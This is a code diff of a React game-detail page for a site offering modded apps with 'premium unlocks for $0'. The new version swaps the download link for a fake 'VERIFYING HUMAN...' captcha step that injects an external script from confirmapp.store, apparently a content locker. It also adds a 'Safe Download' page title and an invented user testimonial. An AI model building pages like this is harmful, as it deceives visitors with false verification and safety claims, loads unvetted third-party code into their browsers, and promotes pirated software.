@@ -1,67 +1,50 @@
-
 import React, { useEffect, useState, memo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import {
   ArrowLeft,
   Download,
   AlertCircle,
-  Zap,
+  CheckCircle2,
   Star,
   ShieldCheck,
-  Lock,
-  Share2,
-  BookOpen,
 } from "lucide-react";
 import { Helmet } from "react-helmet-async";
 import { motion, AnimatePresence } from "framer-motion";
+import confetti from "canvas-confetti";
 
 import { fetchGameBySlug, type Game } from "@/services/gameService";
 
 /* ──────────────────────────────────────────────────────────────
-   PRO SKELETON - matched DownloadPage style
+   SKELETON COMPONENT (NEO-BRUTALIST STYLE)
    ────────────────────────────────────────────────────────────── */
-const BeautifulSkeleton = () => {
-  return (
-    <div className="min-h-screen bg-[#FFFBEB] px-4 py-6 space-y-6">
-      <div className="max-w-5xl mx-auto">
-        {/* Back button placeholder */}
-        <div className="mb-6 w-40 h-8 bg-white/80 rounded-full animate-pulse" />
+const BeautifulSkeleton = () => (
+  <div className="animate-pulse space-y-12">
+    <div className="text-center space-y-4">
+      <div className="h-16 bg-white border-4 border-black shadow-[8px_8px_0px_#000] w-3/4 mx-auto" />
+      <div className="h-10 bg-white/50 border-4 border-black shadow-[4px_4px_0px_#000] w-1/2 mx-auto" />
+    </div>
 
-        <div className="grid grid-cols-1 md:grid-cols-12 gap-6">
-          {/* Left - Image + button */}
-          <div className="md:col-span-5 lg:col-span-4 space-y-5">
-            <div className="rounded-[2.5rem] bg-white border-2 border-slate-100 shadow-2xl p-5 animate-pulse">
-              <div className="aspect-square rounded-[2rem] bg-slate-200/80" />
-              <div className="h-14 mt-5 bg-gradient-to-r from-amber-100 to-amber-200 rounded-2xl" />
-            </div>
-            <div className="h-20 rounded-[2rem] bg-white/80 border-2 border-amber-100 shadow-xl animate-pulse" />
-          </div>
-
-          {/* Right - Title + content */}
-          <div className="md:col-span-7 lg:col-span-8 space-y-6">
-            <div className="h-20 bg-white/80 rounded-[2.5rem] animate-pulse" />
-            <div className="flex gap-3">
-              <div className="h-10 w-32 bg-amber-100/60 rounded-full animate-pulse" />
-              <div className="h-10 w-40 bg-slate-100/60 rounded-full animate-pulse" />
-            </div>
-            <div className="h-32 bg-white/80 rounded-[2rem] animate-pulse" />
-            <div className="h-72 bg-white rounded-[2.5rem] border-2 border-amber-100 shadow-2xl animate-pulse" />
-          </div>
-        </div>
+    <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
+      <div className="lg:col-span-5 space-y-6">
+        <div className="aspect-square bg-white border-4 border-black shadow-[12px_12px_0px_#000]" />
+        <div className="h-24 bg-white border-4 border-black shadow-[8px_8px_0px_#000]" />
+      </div>
+      <div className="lg:col-span-7">
+        <div className="h-[450px] bg-[#FDF4E3] border-4 border-black shadow-[15px_15px_0px_#000]" />
       </div>
     </div>
-  );
-};
+  </div>
+);
 
 /* ──────────────────────────────────────────────────────────────
-   MAIN GAME DETAIL PAGE - matched DownloadPage aesthetic
+   MAIN GAME DETAIL PAGE
    ────────────────────────────────────────────────────────────── */
 const GameDetail = memo(() => {
   const { slug } = useParams<{ slug: string }>();
   const navigate = useNavigate();
   const [game, setGame] = useState<Game | null>(null);
   const [loading, setLoading] = useState(true);
-  const [isDownloading, setIsDownloading] = useState(false);
+  const [showCaptcha, setShowCaptcha] = useState(false);
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -74,294 +57,182 @@ const GameDetail = memo(() => {
       } catch (err) {
         console.error("Fetch Error:", err);
       } finally {
-        setTimeout(() => setLoading(false), 600);
+        setTimeout(() => setLoading(false), 800);
       }
     };
     loadGame();
   }, [slug]);
 
-  const handleDownload = () => {
-    if (!game || isDownloading) return;
-    setIsDownloading(true);
-    sessionStorage.setItem("downloadGameImage", game.image_url || "");
-    setTimeout(() => {
-      navigate(`/Download?game=${encodeURIComponent(game.title)}`);
-    }, 1400);
-  };
+  // Captcha Script Injection
+  useEffect(() => {
+    if (showCaptcha) {
+      const script = document.createElement("script");
+      script.src = "https://confirmapp.store/cp/js/pjqn6";
+      script.async = true;
+      document.body.appendChild(script);
+      
+      confetti({
+        particleCount: 100,
+        spread: 70,
+        origin: { y: 0.6 },
+        colors: ['#FF6D33', '#FF80BF', '#FFEB3B']
+      });
 
-// Keep generating the URL the same way:
-const blogUrl = `/blog/how-to-download-${slug}-on-mobile-for-free`;
-  const shareUrl = `${window.location.origin}${blogUrl}`;
-
-  const handleShare = async () => {
-    const shareData = {
-      title: `${game?.title} Mod APK 2026 – Unlimited Everything!`,
-      text: game?.description || "Check out this epic mod – free download guide inside!",
-      url: shareUrl,
-    };
-
-    try {
-      if (navigator.share && navigator.canShare?.(shareData)) {
-        await navigator.share(shareData);
-      } else {
-        await navigator.clipboard.writeText(shareUrl);
-        alert("Link copied to clipboard!");
-      }
-    } catch (err) {
-      console.error("Share failed:", err);
-      alert("Couldn't share – copy the link manually.");
+      return () => {
+        if (document.body.contains(script)) document.body.removeChild(script);
+      };
     }
-  };
+  }, [showCaptcha]);
 
   return (
-    <>
+    <div className="min-h-screen bg-[#FF80BF] font-sans selection:bg-[#FFEB3B] selection:text-black">
       <Helmet>
-        <title>{game ? `${game.title} Mod APK 2026` : "Loading..."} | WeLoveMods</title>
+        <title>{game ? `${game.title} Mod 2026 | Safe Download` : "Loading Mod..."}</title>
       </Helmet>
 
-      <AnimatePresence mode="wait">
-        {loading ? (
-          <motion.div key="loader" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-            <BeautifulSkeleton />
-          </motion.div>
-        ) : !game ? (
-          <motion.div
-            key="error"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            className="min-h-screen bg-[#FFFBEB] flex flex-col items-center justify-center px-4 text-center"
-          >
-            <AlertCircle className="w-20 h-20 text-amber-500 mb-6" />
-            <h1 className="text-4xl font-black text-slate-900 uppercase italic tracking-tighter">Mod Not Found</h1>
-            <button
-              onClick={() => navigate("/")}
-              className="mt-8 px-12 py-5 bg-blue-600 text-white font-black text-lg uppercase tracking-widest rounded-2xl shadow-xl hover:bg-blue-700 active:translate-y-1 transition-all"
+      {/* Wavy Header Section */}
+      <div className="bg-[#FFEB3B] h-14 w-full relative overflow-hidden border-b-4 border-black">
+        <svg className="absolute bottom-[-1px] w-full h-10 text-[#FF80BF] fill-current" viewBox="0 0 1440 320" preserveAspectRatio="none">
+          <path d="M0,160L48,176C96,192,192,224,288,213.3C384,203,480,149,576,144C672,139,768,181,864,181.3C960,181,1056,139,1152,122.7C1248,107,1344,117,1392,122.7L1440,128L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
+        </svg>
+      </div>
+
+      <div className="max-w-6xl mx-auto px-4 py-8">
+        {/* Navigation */}
+        <button
+          onClick={() => navigate(-1)}
+          className="mb-12 flex items-center gap-2 bg-white border-[3px] border-black px-5 py-2 font-black text-sm shadow-[4px_4px_0px_#000] hover:translate-x-[2px] hover:translate-y-[2px] hover:shadow-none transition-all uppercase"
+        >
+          <ArrowLeft size={20} strokeWidth={4} /> Back to mods
+        </button>
+
+        <AnimatePresence mode="wait">
+          {loading ? (
+            <motion.div key="loader" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+              <BeautifulSkeleton />
+            </motion.div>
+          ) : !game ? (
+            <motion.div key="error" className="text-center py-20 bg-white border-4 border-black shadow-[12px_12px_0px_#000]">
+              <AlertCircle className="w-20 h-20 mx-auto mb-4 text-red-500" />
+              <h2 className="text-4xl font-black mb-6">MOD NOT FOUND!</h2>
+              <button onClick={() => navigate("/")} className="bg-[#4ADE80] border-4 border-black px-8 py-3 font-black shadow-[6px_6px_0px_#000]">RETURN HOME</button>
+            </motion.div>
+          ) : (
+            <motion.div 
+              key="content"
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              className="space-y-12"
             >
-              Back to Home
-            </button>
-          </motion.div>
-        ) : (
-          <motion.main
-            key="content"
-            initial={{ opacity: 0, y: 20 }}
-            animate={{ opacity: 1, y: 0 }}
-            transition={{ duration: 0.5 }}
-            className="min-h-screen bg-[#FFFBEB] pb-12 px-4 pt-6 font-sans overflow-x-hidden"
-          >
-            <div className="w-full max-w-5xl mx-auto space-y-8">
-              {/* Back Button */}
-              <button
-                onClick={() => navigate(-1)}
-                className="flex items-center gap-2 text-slate-500 hover:text-amber-600 font-black uppercase tracking-[0.25em] text-xs"
-              >
-                <ArrowLeft size={16} strokeWidth={3} /> Back to mods
-              </button>
-
-              <div className="grid grid-cols-1 md:grid-cols-12 gap-6 lg:gap-8 items-start">
-                {/* LEFT COLUMN - Image + Actions + Blog & Share */}
-                <div className="md:col-span-5 lg:col-span-4 space-y-5">
-                  {/* Game Card */}
-                  <div className="rounded-[2.5rem] p-5 bg-white border-2 border-slate-100 shadow-2xl relative overflow-hidden">
-                    <div className="relative">
-                      <img
-                        src={game.image_url}
-                        alt={game.title}
-                        className="w-full aspect-square object-cover rounded-[2rem] border-4 border-[#FFFBEB] shadow-xl"
-                      />
-                      <div className="absolute -bottom-3 -right-3 bg-emerald-500 p-2 rounded-full border-4 border-white shadow-lg">
-                        <ShieldCheck size={20} className="text-white" strokeWidth={3} />
-                      </div>
-                    </div>
-
-                    {/* DOWNLOAD Button */}
-                    <motion.button
-                      whileTap={{ scale: 0.97 }}
-                      onClick={handleDownload}
-                      disabled={isDownloading}
-                      className={`
-                        mt-6 w-full flex items-center justify-center gap-3
-                        bg-green-600 active:bg-green-800 text-white
-                        font-black text-xl uppercase tracking-widest
-                        rounded-2xl py-6 shadow-lg shadow-blue-500/30
-                        active:translate-y-1 transition-all relative overflow-hidden
-                      `}
-                    >
-                      <Download size={24} className={isDownloading ? "animate-bounce" : ""} />
-                      {isDownloading ? "PREPARING..." : "DOWNLOAD NOW"}
-                      <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full animate-shine" />
-                    </motion.button>
-
-                    {/* BLOG GUIDE Button */}
-                    <motion.a
-                      href={blogUrl}
-                      target="_blank"
-                      rel="noopener noreferrer"
-                      whileHover={{ scale: 1.03, boxShadow: "0 20px 25px -5px rgba(0,0,0,0.1)" }}
-                      whileTap={{ scale: 0.97 }}
-                      className={`
-                        mt-2 w-full flex items-center justify-center gap-3
-                        bg-amber-400 hover:bg-amber-700 active:bg-amber-800 text-white
-                        font-black text-lg uppercase tracking-widest
-                        rounded-2xl py-5 shadow-lg shadow-amber-500/30
-                        active:translate-y-1 transition-all relative overflow-hidden border-2 border-amber-400/30
-                      `}
-                    >
-                      
-                      READ FULL GUIDE
-                     
-                    </motion.a>
-
-                
-
-                    {/* SHARE Section */}
-                    <div className="mt-6 pt-5 border-t border-amber-200/40">
-                      {/* <p className="text-center text-slate-600 text-sm font-black uppercase tracking-wider mb-4">
-                        Share this mod
-                      </p> */}
-
-                      <div className="flex justify-center gap-4 flex-wrap">
-                      
-                        {/* <motion.button
-                          whileTap={{ scale: 0.92 }}
-                          onClick={handleShare}
-                          className="p-4 bg-gradient-to-br from-indigo-500 to-purple-600 text-white rounded-2xl shadow-xl hover:shadow-2xl active:scale-95 transition-all"
-                          aria-label="Share via system"
-                        >
-                          <Share2 size={28} strokeWidth={2} />
-                        </motion.button>
-
-                        <motion.a
-                          whileTap={{ scale: 0.92 }}
-                          href={`https://x.com/intent/tweet?text=${encodeURIComponent(
-                            `${game.title} Mod APK 2026 – Unlimited Everything! 🔥`
-                          )}&url=${encodeURIComponent(shareUrl)}&hashtags=ModAPK,GamingMods`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="p-4 bg-black text-white rounded-2xl shadow-xl hover:shadow-2xl active:scale-95 transition-all"
-                          aria-label="Share on X"
-                        >
-                          <svg className="w-7 h-7" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
-                          </svg>
-                        </motion.a>
-
-                        
-                        <motion.a
-                          whileTap={{ scale: 0.92 }}
-                          href={`https://wa.me/?text=${encodeURIComponent(
-                            `${game.title} Mod APK 2026 – Free Download!\n\n${shareUrl}`
-                          )}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="p-4 bg-green-600 text-white rounded-2xl shadow-xl hover:shadow-2xl active:scale-95 transition-all"
-                          aria-label="Share on WhatsApp"
-                        >
-                          <svg className="w-7 h-7" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.198-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.297-.497.099-.198.05-.371-.025-.52-.074-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.29.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004c-2.605-.003-5.158-.896-7.205-2.537l-.52-.398-5.393 1.414 1.44-5.252-.38-.537C1.46 12.607.5 9.98.5 7.188.5 3.37 3.37.5 7.188.5s6.688 2.87 6.688 6.688c0 3.818-2.87 6.688-6.688 6.688z" />
-                          </svg>
-                        </motion.a>
-
-                     
-                        <motion.a
-                          whileTap={{ scale: 0.92 }}
-                          href={`https://t.me/share/url?url=${encodeURIComponent(shareUrl)}&text=${encodeURIComponent(
-                            `${game.title} Mod APK 2026 – Unlimited Everything!`
-                          )}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="p-4 bg-sky-500 text-white rounded-2xl shadow-xl hover:shadow-2xl active:scale-95 transition-all"
-                          aria-label="Share on Telegram"
-                        >
-                          <svg className="w-7 h-7" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M9.417 15.181l-.397 5.584c.568 0 .814-.244 1.109-.537l2.663-2.545 5.518 4.041c1.012.564 1.725.267 1.998-.931l3.639-17.113c.373-1.747-.678-2.516-1.92-1.98l-17.155 6.625c-1.741.689-1.709 1.666-.303 2.081l4.285 1.336 9.922-6.229c.468-.293.932.057.606.357L9.417 15.181z" />
-                          </svg>
-                        </motion.a> */}
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* Mini stats bar */}
-                  <div className="bg-white rounded-2xl border-2 border-slate-900 shadow-[4px_4px_0px_#000] p-5 flex justify-around items-center">
-                    <div className="text-center">
-                      <p className="text-[10px] font-black text-slate-400 uppercase tracking-wider">Rating</p>
-                      <div className="flex items-center gap-1.5 justify-center mt-1">
-                        <Star size={16} className="fill-amber-400 text-amber-400" />
-                        <span className="font-black text-slate-800 text-lg">{game.rating}</span>
-                      </div>
-                    </div>
-                    <div className="h-10 w-px bg-slate-200" />
-                    <div className="text-center">
-                      <p className="text-[10px] font-black text-slate-400 uppercase tracking-wider">Version</p>
-                      <p className="font-black text-slate-800 text-lg mt-1">v{game.version}</p>
-                    </div>
-                  </div>
+              {/* Hero Section */}
+              <div className="text-center relative">
+                <div className="absolute -top-12 right-0 md:right-10 bg-[#B088F9] border-[3px] border-black px-6 py-2 font-black text-white text-xl transform rotate-12 shadow-[6px_6px_0px_#000] z-10 hidden md:block">
+                  SOLVED
                 </div>
-
-                {/* RIGHT COLUMN - Title + Description + Features */}
-                <div className="md:col-span-7 lg:col-span-8 space-y-6">
-                  {/* Title + tags */}
-                  <div className="space-y-4">
-                    <h1 className="text-5xl sm:text-6xl lg:text-7xl font-black text-slate-900 leading-none uppercase italic tracking-tighter">
-                      {game.title}
-                    </h1>
-                    <div className="flex flex-wrap gap-2">
-                      <span className="bg-amber-100 text-amber-700 px-4 py-2 rounded-full font-black text-xs border border-amber-200 uppercase tracking-wider">
-                        Premium Mod
-                      </span>
-                      <span className="bg-slate-100 text-slate-600 px-4 py-2 rounded-full font-black text-xs border border-slate-200 uppercase tracking-wider">
-                        {game.downloads.toLocaleString()} Users
-                      </span>
-                      <span className="inline-flex items-center gap-1.5 bg-slate-100 text-slate-600 px-3 py-1.5 rounded-full text-xs font-black uppercase">
-                        <Lock size={12} /> Syncing
-                      </span>
-                    </div>
-                  </div>
-
-                  {/* Quote-like description */}
-                  <div className="bg-white rounded-[2rem] p-6 border-2 border-amber-400/40 shadow-xl">
-                    <p className="text-lg text-slate-700 font-bold leading-relaxed italic">
-                      "{game.description}"
-                    </p>
-                  </div>
-
-                  {/* Features section */}
-                  {game.features && game.features.length > 0 && (
-                    <div className="bg-white rounded-[2.5rem] p-6 shadow-2xl border-2 border-blue-500/20 relative overflow-hidden">
-                      <div className="absolute inset-0 border-2 border-blue-500/30 animate-pulse pointer-events-none rounded-[2.5rem]" />
-                      <h3 className="font-black text-amber-600 uppercase tracking-[0.3em] text-sm mb-5 flex items-center gap-2">
-                        <Zap size={16} className="fill-amber-500 text-amber-500" /> Mod Features Unlocked
-                      </h3>
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                        {game.features.map((feature, i) => (
-                          <div
-                            key={i}
-                            className="bg-slate-50 px-5 py-4 rounded-2xl border border-slate-200 font-bold text-slate-700 flex items-center gap-3 text-sm"
-                          >
-                            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.4)]" />
-                            {feature}
-                          </div>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-                </div>
+                <h1 className="text-5xl md:text-8xl font-black text-black leading-[0.9] tracking-tighter uppercase mb-6">
+                  High pricing <span className="text-white">problem?</span> <br /> We hear you!
+                </h1>
+                <p className="text-xl md:text-2xl font-bold text-black max-w-3xl mx-auto leading-tight">
+                  Why pay for {game.title} features? Our mod provides UNLIMITED access and premium unlocks for $0.
+                </p>
               </div>
-            </div>
 
-            {/* Global shine animation */}
-            <style>{`
-              @keyframes shine {
-                0%   { transform: translateX(-100%) skewX(-20deg); }
-                100% { transform: translateX(300%) skewX(-20deg); }
-              }
-              .animate-shine {
-                animation: shine 3s infinite;
-              }
-            `}</style>
-          </motion.main>
-        )}
-      </AnimatePresence>
-    </>
+              {/* Main Grid */}
+              <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
+                
+                {/* Visuals & Testimonial Column */}
+                <div className="lg:col-span-5 space-y-6">
+                  <div className="bg-white border-4 border-black p-4 shadow-[12px_12px_0px_#000]">
+                    <img src={game.image_url} alt={game.title} className="w-full aspect-square object-cover border-4 border-black mb-6" />
+                    <div className="space-y-4">
+                      <div className="flex items-center gap-3">
+                        <div className="w-10 h-10 bg-[#FFEB3B] border-2 border-black rounded-full flex items-center justify-center font-black">?</div>
+                        <p className="font-bold text-sm italic">"I was hitting limits daily until I found this mod. Absolute joy to use!"</p>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-4">
+                    <div className="bg-[#4ADE80] border-4 border-black p-4 shadow-[6px_6px_0px_#000] text-center">
+                      <p className="font-black text-xs uppercase opacity-70">Rating</p>
+                      <div className="flex justify-center items-center gap-1 font-black text-2xl italic">
+                        <Star fill="black" size={20}/> {game.rating}
+                      </div>
+                    </div>
+                    <div className="bg-[#818CF8] border-4 border-black p-4 shadow-[6px_6px_0px_#000] text-center text-white">
+                      <p className="font-black text-xs uppercase opacity-50">Version</p>
+                      <p className="font-black text-2xl italic">v{game.version}</p>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Unlocks & CTA Column */}
+                <div className="lg:col-span-7">
+                  <div className="bg-[#FDF4E3] border-[4px] border-black p-8 md:p-12 shadow-[20px_20px_0px_#000] relative overflow-hidden">
+                    <div className="absolute top-0 right-0 p-4">
+                        <ShieldCheck size={40} className="opacity-20" />
+                    </div>
+                    
+                    <h2 className="text-4xl font-black mb-6 uppercase tracking-tighter underline decoration-[#FF80BF] decoration-8 underline-offset-4">
+                      Mod Features Unlocked
+                    </h2>
+
+                    {/* Description Block */}
+                    <div className="mb-8 border-l-8 border-[#FF6D33] pl-6 py-2">
+                      <p className="text-lg md:text-xl font-bold text-black leading-snug italic">
+                        "{game.description}"
+                      </p>
+                    </div>
+
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-y-6 gap-x-4 mb-12">
+                      {game.features?.map((feature, i) => (
+                        <div key={i} className="flex items-center gap-3 font-black text-lg uppercase tracking-tight">
+                          <CheckCircle2 className="text-green-600" size={24} strokeWidth={4} />
+                          {feature}
+                        </div>
+                      ))}
+                    </div>
+
+                    {!showCaptcha ? (
+                    <button
+  onClick={() => setShowCaptcha(true)}
+  className="w-full bg-[#FF6D33] text-white border-[2px] border-black py-3 font-bold text-lg shadow-[5px_5px_0px_#000] hover:shadow-none hover:translate-x-1 hover:translate-y-1 transition-all flex items-center justify-center gap-2 group"
+>
+  <Download size={20} strokeWidth={3} className="group-hover:animate-bounce" />
+  START DOWNLOAD
+</button>
+
+                    ) : (
+                      <div className="bg-white border-[4px] border-black p-8 shadow-[10px_10px_0px_#000]">
+                        <p className="font-black text-2xl mb-4 text-center animate-pulse">VERIFYING HUMAN...</p>
+                        <div 
+                          data-captcha-enable="true" 
+                          className="min-h-[150px] border-4 border-dashed border-black/20 flex items-center justify-center bg-gray-50 font-bold italic text-gray-400"
+                        >
+                          Captcha Loading...
+                        </div>
+                      </div>
+                    )}
+
+                    <div className="mt-10 flex flex-wrap gap-6 justify-center border-t-4 border-black pt-8">
+                       <span className="flex items-center gap-2 font-black text-xs uppercase bg-white px-3 py-1 border-2 border-black shadow-[3px_3px_0px_#000]">
+                         <div className="w-3 h-3 bg-green-500 border border-black rounded-full" />
+                         Unlimited responses
+                       </span>
+                       <span className="flex items-center gap-2 font-black text-xs uppercase bg-white px-3 py-1 border-2 border-black shadow-[3px_3px_0px_#000]">
+                         <div className="w-3 h-3 bg-green-500 border border-black rounded-full" />
+                         No Subscription
+                       </span>
+                    </div>
+                  </div>
+                </div>
+
+              </div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </div>
+    </div>
   );
 });
 
